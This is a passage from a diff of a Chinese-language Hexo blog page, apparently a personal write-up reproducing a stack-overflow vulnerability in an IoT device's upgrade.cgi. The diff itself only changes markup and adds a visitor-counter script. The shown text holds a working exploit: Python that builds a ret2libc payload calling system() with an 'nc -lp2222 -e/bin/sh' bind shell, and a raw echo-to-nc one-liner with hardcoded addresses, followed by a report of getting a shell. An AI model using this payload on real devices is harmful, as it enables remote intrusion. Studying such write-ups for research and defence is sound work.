class="string">'a'</span>)  <span class="comment"># padding</span></span><br><span class="line">payload += p32(libc_elf.symbols[<span class="string">'system'</span>] + libc_base) <span class="comment"># 内存中 system() 函数地址</span></span><br><span class="line">payload += (<span class="string">'pwd;'</span> * <span class="number">0x100</span> + <span class="string">'nc\x20-lp2222\x20-e/bin/sh\x20&gt;'</span>) <span class="comment"># 命令参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'echo -en "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:&#123;&#125;\n\r\n\r\n"  | nc -v 192.168.2.2 80'</span>.format(payload)</span><br><span class="line">os.system(payload)</span><br></pre></td></tr></table></figure>
 
 
 
 <h4 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h4><p>由于复现漏洞的虚拟机中并没有pwntools，所以整理成字节码直接跑，有点硬核233333333</p>
-<figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x84\x57\xf7\x76\xe0\xeb\xff\x7e\xa4\x3a\xf4\x76aaaaaaaa\xb0\x4a\xf7\x76pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;nc -lp2222 -e/bin/sh >\n\r\n\r\n" | nc -v 192.168.2.2 80</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x84\x57\xf7\x76\xe0\xeb\xff\x7e\xa4\x3a\xf4\x76aaaaaaaa\xb0\x4a\xf7\x76pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;pwd;nc -lp2222 -e/bin/sh &gt;\n\r\n\r\n" | nc -v 192.168.2.2 80</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="0x05-复现"><a href="#0x05-复现" class="headerlink" title="0x05 复现"></a>0x05 复现</h2><p><img src="./success1.png" alt>  </p>
-<p><img src="./success2.png" alt>  </p>
+<h2 id="0x05-复现"><a href="#0x05-复现" class="headerlink" title="0x05 复现"></a>0x05 复现</h2><p><img src="./success1.png" alt="">  </p>
+<p><img src="./success2.png" alt="">  </p>
 <p>通过此漏洞在远端2222端口反弹一个shell，本地nc过去，成功getshell~。</p>
 <p>到这边整个复现过程就算结束了，其实调试和运行环境布置在树莓派上应该会更好一点，能ida远程调就爽的一批了。</p>
 <h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>这次的复现过程真的值得好好去讲讲，去回味，漏洞本身是不难的，只是一个栈溢出，但是在真实环境下，在IoT环境下，它又是那么与众不同。</p>
 <p>这次的复现真的让我学会了很多，固件、社工(滑稽)、qemu、远程调试、交叉编译、arm语法，甚至arm-pwn…….</p>
 <p>更重要的是，它让我知道了对一个一开始觉得高不可攀无法解决的问题如何起手。</p>
 <p>ps:调试阶段的时候玩gdbserver触发了一个double free，先去看看是否有相关的漏洞，没有的话过几天调一波~</p>
-<p><img src="./cve1.png" alt>  </p>
+<p><img src="./cve1.png" alt="">  </p>
 <p>xdw 加油加油~</p>
-</body></html>
+
     </div>
 
     
@@ -512,10 +510,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -541,6 +569,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
